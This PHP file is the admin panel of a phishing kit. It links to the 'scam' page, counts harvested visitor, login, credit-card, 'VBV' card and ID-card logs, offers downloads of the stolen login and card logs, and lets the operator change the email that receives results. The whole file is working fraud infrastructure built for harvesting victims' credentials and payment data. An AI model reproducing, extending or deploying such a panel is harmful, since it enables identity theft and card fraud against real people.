<?php
ob_start();
session_start();
ob_end_clean();
if(!isset($_SESSION['username'])){
header("location:login.php");
exit;
}
?>
<html>
<head>
	<title>SOMETHING PANEL V1</title>
	<link href="//brobin.github.io/hacker-bootstrap/css/hacker.css" rel="stylesheet">
  <link href="img/something-ico.png" rel="icon" type="image/x-icon" />
</head>
<body>

    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" href="#"><img src="img/something-logo.png" width="180"></a>
                </div>
            <div id="navbar" class="navbar-collapse collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="../" target="_blank">View Scam</a>
                    </li>
                    <li>
                        <a href="https://www.facebook.com/founder.agility" target="_blank">Contact Provider</a>
                    </li>
                    <li>
                        <a href="./logout.php">Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <marquee behavior="alternate" onmouseover="this.stop()" onmouseout="this.start()"><h4 style="font-family:verdana;">
<script type='text/javascript'>
//<![CDATA[

var text="Welcome To SOMETHING PANEL V1" //Ganti dengan teks anda
var speed=80 //Kecepatan ganti warna

if (document.all||document.getElementById){
document.write('<span id="highlight">' + text + '</span>')
var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
}
else
document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
var r=1
var g=1
var b=1
var seq=1
function changetext(){
rainbow="#"+hex[r]+hex[g]+hex[b]
storetext.style.color=rainbow
}
function change(){
if (seq==6){
b--
if (b==0)
seq=1
}
if (seq==5){
r++
if (r==12)
seq=6
}
if (seq==4){
g--
if (g==0)
seq=5
}
if (seq==3){
b++
if (b==12)
seq=4
}
if (seq==2){
r--
if (r==0)
seq=3
}
if (seq==1){
g++
if (g==12)
seq=2
}
changetext()
}
function starteffect(){
if (document.all||document.getElementById)
flash=setInterval("change()",speed)
}
starteffect()

//]]>
</script></h4></marquee>
<div class="container">
        <div class="row">
            <div class="col-lg-6">
                <div class="well">
<legend>Email Configuration</legend>
    <form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="3">
  <label class="control-label">Email</label>
  <div class="input-group">
        <span class="input-group-addon"><?php include '../config.php'; echo $Your_Email;?></span>
        <input type="email" class="form-control" name="Your_Email" placeholder="your new email" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">SAVE</button>
        </span>
        </div>
</div>
</form>
<form action="./update.php" method="post">
<div class="field">
  <input name="updateType" type="hidden" value="2">
  <label class="control-label">Panel Password</label>
  <div class="input-group">
        <span class="input-group-addon"><?php include '../config.php'; echo $Password;?></span>
        <input type="text" class="form-control" name="panelPassword" placeholder="your new password" pattern=".{5,}" required>
        <span class="input-group-btn">
        <button class="btn btn-default" id="submit">SAVE</button>
        </span>
        </div>
</div>
</form>

</div>

<?php
$clickLines = count(file("../logs/visitor-log.txt"));
$loginLines = count(file("../logs/some-login.txt"));
$ccLines = count(file("../logs/some-cc.txt"));
$vbvLines = count(file("../logs/some-vbv.txt"));
$idLines = count(file("../logs/some-id.txt"));
?>
<button class="btn btn-danger">Click <span class="badge"><?php echo $clickLines?></span></a></button>
<button class="btn btn-warning">Login <span class="badge"><?php echo $loginLines?></span></a></button>
<button class="btn btn-primary">CC <span class="badge"><?php echo $ccLines?></span></a></button>
<button class="btn btn-info">VBV CC <span class="badge"><?php echo $vbvLines?></span></a></button>
<button class="btn btn-info">ID Card <span class="badge"><?php echo $idLines?></span></a></button>
<br>
<button class="btn btn-default"><a href="clear.php?file=clearAll">Clear Log</a></button>
<button class="btn btn-default"><a href="../logs/some-acc.log">Get Log Login</a></button>
<button class="btn btn-default"><a href="../logs/some-cc.log">Get CC BIN</a></button>
<button class="btn btn-default"><a href="../logs/some-vbv-cc.log">Get VBV CC</a></button>
</div>
</div>
  <div class="row tall-row">
  <div class="col-md-12">
  <br>
  <p>Created by <a href="https://www.facebook.com/founder.agility">Febriyanto Hamonangan</a>. © 2018</p>
  </div>
  </div>
</div>


</body>
</html>